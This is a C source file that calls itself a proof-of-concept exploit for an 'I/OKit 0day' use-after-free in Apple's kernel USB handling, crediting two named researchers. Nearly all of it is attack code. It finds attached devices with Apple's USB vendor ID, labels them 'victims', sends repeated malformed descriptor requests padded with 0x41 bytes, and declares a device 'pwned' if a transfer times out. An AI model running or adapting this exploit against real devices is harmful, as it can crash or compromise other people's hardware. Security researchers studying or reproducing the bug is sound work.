#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/mman.h>
#include <libusb-1.0/libusb.h>

libusb_device **devs = NULL;

static char* error(int code){

	switch(code){

	case LIBUSB_ERROR_IO:
		return "IO_ERROR";
		break;

	case LIBUSB_ERROR_INVALID_PARAM:
		return "INVALID_PARAM";
		break;

	case LIBUSB_ERROR_ACCESS:
		return "ACCESS_ERROR";
		break;

	case LIBUSB_ERROR_NO_DEVICE:
		return "NO_DEVICE";
		break;

	case LIBUSB_ERROR_NOT_FOUND:
		return "NOT_FOUND";
		break;

	case LIBUSB_ERROR_BUSY:
		return "BUSY";
		break;

	case LIBUSB_ERROR_TIMEOUT:
		return "TIMEOUT";
		break;

	case LIBUSB_ERROR_OVERFLOW:
		return "OVERFLOW";
		break;

	case LIBUSB_ERROR_PIPE:
		return "PIPE_ERROR";
		break;

	case LIBUSB_ERROR_INTERRUPTED:
		return "SYSCALL_INTERRUPTED";
		break;

	case LIBUSB_ERROR_NO_MEM:
		return "NO_MEM";
		break;

	case LIBUSB_ERROR_NOT_SUPPORTED:
		return "NOT_SUPPORTED";
		break;

	case LIBUSB_ERROR_OTHER:
		return "OTHER";
		break;

	default:
		return "UNKNOWN";
		break;
	}
}

/*
 * Function: isTarget
 * Arguments: A libusb_device reference
 * Returns: Boolean
*/

int SUPPORTED_VIDS[] = {0x5AC};

int isTarget(libusb_device *dev){
	struct libusb_device_descriptor desc;
	libusb_device_handle *handle = NULL;

	char description[260];
	char string[256];

	int ret;
	uint8_t i;

	ret = libusb_get_device_descriptor(dev, &desc);
	if(ret < 0){
		return 0;
	}
	ret = libusb_open(dev, &handle);
	if(LIBUSB_SUCCESS != ret)
		return 0;
	for(int i = 0; i < sizeof(SUPPORTED_VIDS) / sizeof(SUPPORTED_VIDS[0]); i++){
		if(desc.idVendor == SUPPORTED_VIDS[i]){
			libusb_close(handle);
			return 1;
		}
	}

	libusb_close(handle);
	return 0;
}

void resetUSB(libusb_device_handle* handle) {

    int success;
    int bpoint = 0;

    do {
        success = libusb_reset_device(handle);
	if ((bpoint % 10) == 0) {
            printf(".");
        }

        ++bpoint;

        if (bpoint > 100) {
            success = 1;
        }

    } while (success < 0);

    if (success) {
        printf("\nreset usb device failed:%d\n", success);
    } else {
        printf("\nreset usb device ok\n");
    }
}


void pwn_device(libusb_device *dev){
	libusb_device_handle *handle = NULL;
	libusb_open(dev, &handle);
	libusb_claim_interface(handle,0);
	int r = 0;

	char *data = malloc(108);
	memset(data, 0x41, 108);
	for(int i = 0; i < 5; i++){
		int response = libusb_control_transfer(handle, 0|0x80, 0x6, 0x30c, 0x409, data, 108, 40);
		printf("xnu[USB][#%d][%d] = %s\n",time(0) , i, error(response));
		if(response == LIBUSB_ERROR_TIMEOUT)
			r = 1;
	}

	printf("Please detach the victim device.\n");
	libusb_release_interface(handle,0);
	libusb_reset_device(handle);
	libusb_close(handle);
	free(data);
	data = NULL;
	printf("Device %s\n", r ? "got pwned!" : "might not have been pwned :(");
}

void get_devices(void){
	ssize_t cnt;
	int r, i;
	r = libusb_init(NULL);
	if(r < 0)
		exit(1);
	cnt = libusb_get_device_list(NULL, &devs);
	if(cnt < 0){
		printf("No devices available\n");
		exit(1);
	}
	r = 0;
	for(i = 0; devs[i]; ++i){
		if(isTarget(devs[i])){
			printf("Found victim device.!\n");
			r = 1;
			printf("Pwning the victim...\n");
			pwn_device(devs[i]);
		}
	}
	if(!r){
		printf("Couldn't find any victim devices.\n");
	}
	libusb_free_device_list(devs, 1);
	libusb_exit(NULL);
}

int main(int argc, char *argv[]){
	printf("Exploit: I/OKit 0day\n");
	printf("Research & Discovery: Sem Voigtlander (@userlandkernel)\n");
        printf("Reproduction: Raz Mashat\n");
	printf("Description:\
A use after free exists in the handling of hardware interrupts.\n\
This proof-of-concept triggers an USB interrupt that implements the vulnerable component.\n\
More interfaces to this attack might exist in the kernel in proprietary drivers.\n\n");

	printf("Finding victim devices: ");
	get_devices();
	return 0;
}
